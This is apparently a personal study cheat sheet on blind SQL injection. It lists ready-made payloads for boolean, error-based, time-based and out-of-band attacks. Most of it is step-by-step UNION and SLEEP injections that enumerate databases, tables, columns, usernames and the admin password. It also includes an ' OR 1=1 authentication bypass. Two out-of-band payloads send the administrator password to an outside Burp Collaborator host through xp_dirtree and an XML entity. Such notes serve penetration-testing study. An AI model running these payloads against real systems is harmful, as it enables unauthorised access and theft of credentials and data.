---
title: BLIND INJECTION
updated: 2023-11-11 10:14:49Z
created: 2023-11-05 05:07:00Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

## Boolean Based SQL Injection

`select * from users where username = '%username%' LIMIT 1;`

Try to find a query that returns a true statement (like http://target/product?id=1)  
then send confirm you can send it a FALSE statement (eg, id=hacked), then APPEND to this to try and make the database confirm TRUE things

Try the cookie:

Cookie: TrackingId=YZ4gxazL0b9VReCc  
`Cookie: TrackingId=YZ4gxazL0b9VReCc'`  
`Cookie: TrackingId=YZ4gxazL0b9VReCc''`

&nbsp;

1.  Find the number of columns:  
    `id=hacked' UNION SELECT 1;--`  
    `id=hacked' UNION SELECT 1,2;--`  
    `id=hacked' UNION SELECT 1,2,3;--`
    
2.  Enumerate the databases to find **databasename**  
    `id=hacked' UNION SELECT 1,2,3 where database() like '%';--` (should return True)  
    `id=hacked' UNION SELECT 1,2,3 where database() like 'a%';--`  
    `id=hacked' UNION SELECT 1,2,3 where database() like 'b%';--`  
    `id=hacked' UNION SELECT 1,2,3 where database() like 'c%';--`  
    etc
    
3.  Enumerate Tables to find **tablename**  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'a%';--`  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'b%';--`  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'c%';--`  
    etc
    
4.  Enumerate Columns to find **columnname**  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='databasename' and TABLE_NAME='tablename' and COLUMN_NAME like 'a%';--`  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='databasename' and TABLE_NAME='tablename' and COLUMN_NAME like 'b%';--`  
    `id=hacked' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='databasename' and TABLE_NAME='tablename' and COLUMN_NAME like 'c%';--`  
    etc
    

Once you've found a column (like "admin"), then exclude for further scans  
`id=hacked' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='databasename' and TABLE_NAME='tablename' and COLUMN_NAME like 'a%' and COLUMN_NAME !='users';--`

5.  Enumerate data (username) from the Column (users)  
    `id=hacked' UNION SELECT 1,2,3 from users where username like 'a%';--`  
    `id=hacked' UNION SELECT 1,2,3 from users where username like 'b%';--`  
    `id=hacked' UNION SELECT 1,2,3 from users where username like 'c%';--`  
    `id=hacked' UNION SELECT 1,2,3 from users where username like 'c%' and username !='admin';--`  
    etc
    
6.  Enumerate data (password) from the Column(user) where the users is admin  
    `id=hacked' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--`  
    `id=hacked' UNION SELECT 1,2,3 from users where username='admin' and password like 'b%';--`  
    `id=hacked' UNION SELECT 1,2,3 from users where username='admin' and password like 'c%';--`  
    etc
    




## Authentication Bypass

`' OR 1=1;--`

* * *

## BLIND SQL attacks using conditional ERRORS

`' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--`  
**CASE** expression evaluates to 'a', which does not cause any error

`' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--`  
**CASE** evaluates to 1/0, which causes a divide-by-zero error.

These inputs use the **CASE** keyword to test a condition and return a different expression depending on whether the expression is **True**:

Using this technique, you can retrieve data by testing one character at a time:  
`' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'--`

* * *

## Time Based SQL Injection

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement

The techniques for triggering a time delay are specific to the type of database being used


`%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

1.  Find the number of columns:  
    `id=hacked' UNION SELECT SLEEP(5);--`

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

`id=hacked' UNION SELECT SLEEP(5),2;--`  
`id=hacked' UNION SELECT SLEEP(5),2,3;--`  
etc

2.  Enumerate the databases to find **databasename**  
    `id=hacked' UNION SELECT SLEEP(5),2,3 where database() like '%';--` (should return True)  
    `id=hacked' UNION SELECT SLEEP(5),2,3 where database() like 'a%';--`  
    `id=hacked' UNION SELECT SLEEP(5),2,3 where database() like 'b%';--`  
    `id=hacked' UNION SELECT SLEEP(5),2,3 where database() like 'c%';--`  
    etc
    
3.  Enumerate Tables to find **tablename**  
    `id=hacked' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'a%';--`  
    `id=hacked' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'b%';--`  
    `id=hacked' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema = 'databasename' and table_name like 'c%';--`  
    etc
    
4.  Enumerate Columns to find **columnname**  
    `id=hacked' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='databasename' and TABLE_NAME='tablename' and COLUMN_NAME like 'a%';--`
    
## Time Based Conditional

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
	
* * *

## Out-Of-Band SQL Injection

**CHANNEL 1** > Launch the Attack (eg Web Request)  
**CHANNEL 2** > To Receive the Results (eg monitoring HTTP/DNS requests)

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query

Use the out-of-band channel to exfiltrate data from the vulnerable application. For example: 
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`